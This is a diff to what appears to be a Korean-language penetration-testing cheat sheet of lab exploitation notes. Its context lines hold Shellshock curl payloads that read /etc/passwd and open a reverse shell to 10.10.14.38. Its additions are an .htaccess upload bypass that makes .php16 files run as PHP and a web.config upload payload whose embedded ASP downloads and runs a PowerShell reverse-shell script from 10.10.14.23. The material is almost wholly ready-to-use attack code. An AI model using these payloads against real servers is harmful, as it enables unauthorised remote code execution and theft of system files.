@@ -1292,6 +1292,13 @@ curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' 
 
 curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
 ```
+
+### .htaccess bypass
+- `.htaccess`가 업로드 가능하면 우회.
+```bash
+# cat .htaccess
+AddType application/x-httpd-php .php16
+```
     
 </details>
 
@@ -1486,6 +1493,33 @@ cadaver http://10.10.10.15
 
 help
 ```
+
+### Upload web.config RCE
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<configuration>
+    <system.webServer>
+      <handlers accessPolicy="Read, Script, Write">
+         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
+      </handlers>
+      <security>
+         <requestFiltering>
+            <fileExtensions>
+               <remove fileExtension=".config" />
+            </fileExtensions>
+            <hiddenSegments>
+               <remove segment="web.config" />
+            </hiddenSegments>
+         </requestFiltering>
+      </security>
+   </system.webServer>
+</configuration>
+<%@ Language=VBScript %>
+<%
+  call Server.CreateObject("WSCRIPT.SHELL").Run("cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.23/Invoke-PowerShellTcp.ps1')")
+%>
+```
+
 </details>
 
 ---
